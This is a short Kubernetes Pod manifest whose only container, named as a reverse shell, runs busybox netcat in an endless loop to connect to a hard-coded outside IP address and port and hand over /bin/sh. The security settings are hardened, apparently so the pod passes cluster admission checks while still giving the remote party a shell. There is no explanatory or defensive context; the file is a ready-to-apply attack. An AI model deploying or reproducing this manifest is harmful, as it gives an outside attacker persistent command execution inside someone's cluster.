apiVersion: v1
kind: Pod
metadata:
  name: cyerspod
  labels:
    app: nc
spec:
  containers:
  - name: cyereverseshell
    image: busybox
    args: ["sh", "-c", "while true; do nc 68.183.22.232 4641 -e /bin/sh; sleep 10; done"]
    securityContext:
      allowPrivilegeEscalation: false
      runAsNonRoot: true
      capabilities:
        drop: ["ALL"]
      seccompProfile:
        type: RuntimeDefault
    volumeMounts:
    - name: tempvolume
      mountPath: /host
  volumes:
  - name: tempvolume
    emptyDir: {}
